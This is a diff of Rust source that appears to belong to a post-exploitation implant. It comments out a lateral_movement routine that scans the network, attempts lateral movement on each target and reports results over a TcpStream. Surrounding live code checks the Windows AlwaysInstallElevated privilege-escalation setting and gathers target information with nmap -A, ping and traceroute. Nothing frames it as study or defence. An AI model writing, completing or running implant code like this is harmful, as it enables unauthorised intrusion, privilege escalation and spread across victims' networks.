@@ -448,38 +448,37 @@ async fn attempt_always_install_elevated() -> bool {
     output.contains("0x1")
 }
 
-pub async fn lateral_movement(conn: &mut TcpStream) -> Result<(), ()> {
-    let targets = scan_network().await;
-    let mut report = String::new();
+// pub async fn lateral_movement(conn: &mut TcpStream) -> Result<(), ()> {
+//     let targets = scan_network().await;
+//     let mut report = String::new();
 
-    if targets.is_empty() {
-        report.push_str("No lateral movement targets found\n");
-    } else {
-        report.push_str(&format!("Lateral movement targets: {:?}\n", targets));
+//     if targets.is_empty() {
+//         report.push_str("No lateral movement targets found\n");
+//     } else {
+//         report.push_str(&format!("Lateral movement targets: {:?}\n", targets));
 
-        for target in targets {
-            if attempt_lateral_movement(&target).await {
-                report.push_str(&format!(
-                    "Lateral movement successful on target: {}\n",
-                    target
-                ));
-                let target_info = get_target_info(&target).await;
-                report.push_str(&format!("Target Info: {}\n", target_info));
-            } else {
-                report.push_str(&format!("Lateral movement failed on target: {}\n", target));
-            }
-        }
-    }
+//         for target in targets {
+//             if attempt_lateral_movement(&target).await {
+//                 report.push_str(&format!(
+//                     "Lateral movement successful on target: {}\n",
+//                     target
+//                 ));
+//                 let target_info = get_target_info(&target).await;
+//                 report.push_str(&format!("Target Info: {}\n", target_info));
+//             } else {
+//                 report.push_str(&format!("Lateral movement failed on target: {}\n", target));
+//             }
+//         }
+//     }
 
-    write(conn, report.as_bytes().to_vec()).await.unwrap();
-    Ok(())
-}
+//     write(conn, report.as_bytes().to_vec()).await.unwrap();
+//     Ok(())
+// }
 
 async fn get_target_info(target: &str) -> String {
     let mut info = String::new();
     info.push_str(&format!("Target: {}\n", target));
 
-    // Perform an nmap scan to gather information about open ports and services
     let output = process::Command::new("nmap")
         .arg("-A")
         .arg(target)
@@ -490,7 +489,6 @@ async fn get_target_info(target: &str) -> String {
     info.push_str("Nmap Scan Results:\n");
     info.push_str(&String::from_utf8_lossy(&output.stdout));
 
-    // Perform a ping to check if the target is reachable
     let output = process::Command::new("ping")
         .arg("-c 4")
         .arg(target)
@@ -501,7 +499,6 @@ async fn get_target_info(target: &str) -> String {
     info.push_str("\nPing Results:\n");
     info.push_str(&String::from_utf8_lossy(&output.stdout));
 
-    // Perform a traceroute to the target
     let output = process::Command::new("traceroute")
         .arg(target)
         .output()
